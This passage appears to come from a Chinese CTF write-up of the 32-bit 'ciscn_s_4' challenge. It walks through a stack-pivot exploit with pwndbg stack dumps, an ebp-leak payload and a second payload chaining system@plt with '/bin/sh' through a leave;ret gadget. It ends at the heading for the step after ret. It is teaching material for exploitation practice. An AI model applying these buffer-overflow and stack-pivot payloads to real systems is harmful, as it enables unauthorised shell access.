
## 栈布局

### `pwndbg> stack` 输出

```
pwndbg> stack 30
00:0000│ esp 0xffffd048 —▸ 0xffffd098 —▸ 0xffffd0a8 ◂— 0x0
01:0004│     0xffffd04c ◂— 0x30 /* '0' */
02:0008│     0xffffd050 —▸ 0xffffd070 ◂— 0x61616161 ('aaaa')
03:000c│     0xffffd054 —▸ 0xf7ed9c43 (__read_nocancel+25) ◂— pop    ebx
04:0010│     0xffffd058 ◂— 0x0
05:0014│     0xffffd05c —▸ 0x80485e5 (vul+80) ◂— add    esp, 0x10
06:0018│     0xffffd060 ◂— 0x0
07:001c│     0xffffd064 —▸ 0xffffd070 ◂— 0x61616161 ('aaaa')
08:0020│     0xffffd068 ◂— 0x30 /* '0' */
09:0024│     0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
0a:0028│ ecx 0xffffd070 ◂— 0x61616161 ('aaaa')
... ↓
12:0048│     0xffffd090 —▸ 0x80486d8 ◂— push   edi
13:004c│     0xffffd094 —▸ 0xffffd154 —▸ 0xffffd327 ◂— './ciscn_s_4'
14:0050│ ebp 0xffffd098 —▸ 0xffffd0a8 ◂— 0x0
15:0054│     0xffffd09c —▸ 0x804862a (main+43) ◂— mov    eax, 0
16:0058│     0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0
17:005c│     0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1
```

可以看到 `ebp` 的内容是 `0xffffd0a8`，输入的 `buf` 的地址是 `0xffffd070`，相差 `0x38`。

## 第一次构造的 `payload`

```
payload = 'a' * (0x28)
io.send(payload)
io.recvuntil('a' * 0x28)
ebp = u32(io.recv(4))
print hex(ebp)
```

## 第二次构造的 `payload`

```
payload = p32(sys_addr) + 'aaaa' + p32(buf_add+12) + b"/bin/sh\x00"
payload += (0x28 - len(payload)) * b'a' + p32(buf_add-4) + p32(leave)
```

前面的 `0x28` 是用来填充，`buf_addr-4` 是覆写 `ebp` 的地址，`leave` 覆写 `ret` 的地址。

所有的流程如下：

![](https://bbs.kanxue.com/upload/attach/202108/906508_BQAUCW64WPUTJ8N.png)

## 具体的调试情况

### 执行源程序中的 `leave` 前

```
EAX 0x8
EBX 0x0
ECX 0xffffffff
EDX 0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0
EDI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
ESI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
EBP 0xffffd098 —▸ 0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
ESP 0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]
EIP 0x80485fd (vul+104) ◂— leave
──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
0x80485ee <vul+89>                     push   eax
0x80485ef <vul+90>                     push   0x80486ca
0x80485f4 <vul+95>                     call   printf@plt <0x80483e0>
0x80485f9 <vul+100>                    add    esp, 0x10
0x80485fc <vul+103>                    nop
► 0x80485fd <vul+104>                  leave
0x80485fe <vul+105>                    ret
↓ 0x80484b8 <deregister_tm_clones+40>  leave
0x80484b9 <deregister_tm_clones+41>    ret
↓ 0x8048400 <system@plt>               jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] <0x804a018>
0x8048406 <system@plt+6>               push   0x18
───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd070 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]
01:0004│     0xffffd074 ◂— 0x61616161 ('aaaa')
02:0008│     0xffffd078 —▸ 0xffffd07c ◂— '/bin/sh'
03:000c│     0xffffd07c ◂— '/bin/sh'
04:0010│     0xffffd080 ◂— 0x68732f /* '/sh' */
05:0014│     0xffffd084 ◂— 0x61616161 ('aaaa')
```

### 执行源程序中的 `leave` 后

```
EAX 0x8
EBX 0x0
ECX 0xffffffff
EDX 0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0
EDI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
ESI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
EBP 0xffffd06c —▸ 0xf7fb7d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
ESP 0xffffd09c —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave
EIP 0x80485fe (vul+105) ◂— ret
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
0x80485ef <vul+90>                     push   0x80486ca
0x80485f4 <vul+95>                     call   printf@plt <0x80483e0>
0x80485f9 <vul+100>                    add    esp, 0x10
0x80485fc <vul+103>                    nop
0x80485fd <vul+104>                    leave
► 0x80485fe <vul+105>                  ret             <0x80484b8; deregister_tm_clones+40>
↓ 0x80484b8 <deregister_tm_clones+40>  leave
0x80484b9 <deregister_tm_clones+41>    ret
↓ 0x8048400 <system@plt>               jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+24] <0x804a018>
0x8048406 <system@plt+6>               push   0x18
0x804840b <system@plt+11>              jmp    0x80483c0
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp 0xffffd09c —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave
01:0004│     0xffffd0a0 —▸ 0xf7fb73dc (__exit_funcs) —▸ 0xf7fb81e0 (initial) ◂— 0x0
02:0008│     0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1
03:000c│     0xffffd0a8 ◂— 0x0
04:0010│     0xffffd0ac —▸ 0xf7e1c647 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│     0xffffd0b0 —▸ 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
... ↓
07:001c│     0xffffd0b8 ◂— 0x0
```

### 执行完源程序中的 `ret` 后
